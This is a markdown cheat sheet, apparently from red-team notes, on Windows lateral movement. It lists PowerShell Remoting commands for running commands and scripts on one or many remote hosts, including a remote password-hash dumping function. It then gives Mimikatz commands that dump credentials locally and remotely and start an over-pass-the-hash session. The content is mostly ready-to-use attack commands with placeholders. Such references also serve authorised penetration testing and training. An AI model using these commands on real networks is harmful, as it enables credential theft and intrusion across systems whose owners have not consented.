# Lateral Movement
## PowerShell Remoting
PowerShell Remoting needs local admin access, and is enabled by default on Servers.
It can be enabled on workstations using
`Enable-PSRemoting`

### One-to-One
 - Connect to a server using PowerShell Remoting
`Enter-PSSession <servername>`
 - Create a session for reuse
`$sessionname = New-PSSession <targetserver>`
 - Enter the saved session
`Enter-PSSession $sessionname`
 - Run commands on a remote server
`Invoke-Command -ScriptBlock{whoami;hostname} -ComputerName <computer-name>`
 - Run scripts on a remote server (encodes in base64 scriptblock and runs in memory on the target)
`Invoke-Command -FilePath c:\scripts\script.ps1 -ComputerName <computer-name>`
 - Run locally loaded functions on remote machines
`Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName <computer-name>`
 - Pass **positional** arguments to locally loaded functions on remote machines
`Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName <computer-name> - ArgumentList`
 - Run "Stateful" commands on a remote session
```
# Create a session
$sessionname = New-PSSession <targetserver>
# Execute the command in the session and save to a variable
Invoke-Command -Session $sessionname -ScriptBlock {$Proc = Get-Process}`
# Execute the command variable in the session
Invoke-Command -Session $sessionname -ScriptBlock {$Proc}
# Treat the variable like the route function as required
Invoke-Command -Session $sessionname -ScriptBlock {$Proc.Name}
```

### One-to-Many (Fan-out)
All of the One-to-One commands can be run in parallel on multiple targets by providing a list.
 - Run commands on a list of servers
`Invoke-Command -ScriptBlock{whoami;hostname} -ComputerName (Get-Content <listofservers>`)
 - Run scripts on a list of remote servers
`Invoke-Command -FilePath c:\scripts\script.ps1 -ComputerName (Get-Content <listofservers>)`

### Credentials
All of the above commands can have the credentials entered manually when prompted. It can be easier to save these to a variable.
```
$securepassword = ConvertTo-SecureString '<password123>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<domain>\<username>', $SecPassword)
Invoke-Command -ComputerName <computer-name> -Credential $Cred -ScriptBlock {whoami}
```
## Mimikatz
We can use Mimikatz remotely to extract credentials and do all kinds of other cool stuff.
 - Dump credentials on local machine
`Invoke-Mimikatz`
Or
`Invoke-Mimikatz -Command '"sekurlsa::ekeys"'`
 - Dump credentials on remote machines (uses Invoke-Command in the background)
`Invoke-Mimikatz -ComputerName <computername>`
 - On multiple targets
`Invoke-Mimikatz -ComputerName @("sys1", "sys2")`
 - **Over pass the hash** and start a new PowerShell process as the target user
`Invoke-Mimikatz -Command '"sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<ntlmhash> /run:powershell.exe"'`